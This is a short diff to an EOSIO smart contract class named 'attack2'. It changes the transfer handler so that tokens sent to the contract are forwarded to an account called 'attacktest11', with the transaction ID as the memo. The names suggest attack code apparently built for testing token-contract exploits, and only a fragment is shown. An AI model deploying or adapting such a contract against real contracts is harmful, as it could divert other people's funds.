@@ -13,11 +13,13 @@ class attack2 : public contract
 
     void transfer(account_name from, account_name to, asset quantity, string memo)
     {
-        string send_memo = "";
-        action(permission_level{ _self, N(active) },
-           N(eosio.token),
-           N(transfer),
-           make_tuple(_self, N(testcontract), quantity, memo)).send();
+        if (to == _self) {
+            string send_memo = get_transaction_id();
+            action(permission_level{ _self, N(active) },
+            N(eosio.token),
+            N(transfer),
+            make_tuple(_self, N(attacktest11), quantity, send_memo)).send();
+        }
     }
   private:
     string to_hex(const char* d, uint32_t s)
